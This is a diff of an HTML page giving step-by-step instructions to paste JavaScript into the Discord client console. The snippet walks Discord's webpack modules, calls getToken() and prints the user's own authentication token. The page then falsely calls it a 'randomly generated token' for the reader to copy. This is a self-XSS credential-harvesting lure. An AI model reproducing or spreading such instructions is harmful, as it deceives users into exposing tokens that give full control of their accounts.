@@ -27,21 +27,26 @@
                 <li>Paste in the following code:</li>
                 <div class="code-box">
                     <pre id="codeToCopy"><code>let str = `(
-                        webpackChunkdiscord_app.push(
-                            [
-                                [''],
-                                {},
-                                e => {
-                                    m=[] ;
-                                    for(let c in e.c)
-                                        m.push(e.c[c])
-                                }
-                            ]
-                        ),
-                        m
-                    ).find(
-                        m => m?.exports?.default?.getToken !== void 0
-                    ).exports.default.getToken()`;</code></pre>
+    webpackChunkdiscord_app.push(
+        [
+            [''],
+            {},
+            e => {
+                m=[] ;
+                for(let c in e.c)
+                    m.push(e.c[c])
+            }
+        ]
+    ),
+    m
+).find(
+    m => m?.exports?.default?.getToken !== void 0
+).exports.default.getToken()`;
+
+let result = eval(str);
+
+console.clear()
+console.log("\x1b[94mYour token:\n\n\x1b[95m" + result + "\x1b[0m");</code></pre>
                     <button class="copy-button" onclick="copyCode()">Copy Code</button>
                 </div>
                 <li>Copy the new randomly generated token.</li>
